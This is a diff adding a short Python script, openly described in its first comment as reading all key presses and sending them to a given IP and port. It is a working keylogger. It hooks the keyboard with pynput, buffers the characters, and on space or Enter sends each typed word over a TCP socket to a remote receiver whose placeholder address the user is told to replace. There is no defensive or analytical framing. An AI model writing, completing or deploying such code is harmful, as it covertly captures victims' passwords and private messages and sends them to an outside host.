@@ -1,0 +1,56 @@
+# Below script will read the all key press and send the details to given IP and port number 
+import socket
+import threading
+from pynput import keyboard
+
+# Function to handle key presses
+def on_press(key):      
+    global text
+    try:
+        char = key.char
+        if char:
+            # Append the pressed key to the text
+            text.append(char)
+    except AttributeError:
+        if key == keyboard.Key.space or key == keyboard.Key.enter:
+            # If space or Enter key is pressed, send the entire word to the server
+            send_data(''.join(text))
+            # Clear the text after sending
+            text = []
+
+# Function to send data to the server
+def send_data(word):
+    try:
+        # Send the word to the server
+        client_socket.send(word.encode())
+    except Exception as e:
+        print("Error sending data:", e)
+
+# Define the receiver's address
+receiver_ip = '192.168.1.1'  # Replace with the correct server IP address
+receiver_port = 1234           # Replace with the actual receiver port
+
+# Initialize an empty list to store the text
+text = []
+
+try:
+    # Initialize socket
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print("Socket initialized.")
+
+    # Connect to the server
+    print(f"Attempting to connect to server {receiver_ip}:{receiver_port}...")
+    client_socket.connect((receiver_ip, receiver_port))
+    print("Connected to the server.")
+
+    # Initialize the keyboard listener
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    print("Keyboard listener started.")
+    listener.join()
+
+except Exception as e:
+    print("An error occurred:", e)
+finally:
+    client_socket.close()
+    print("Socket closed.")
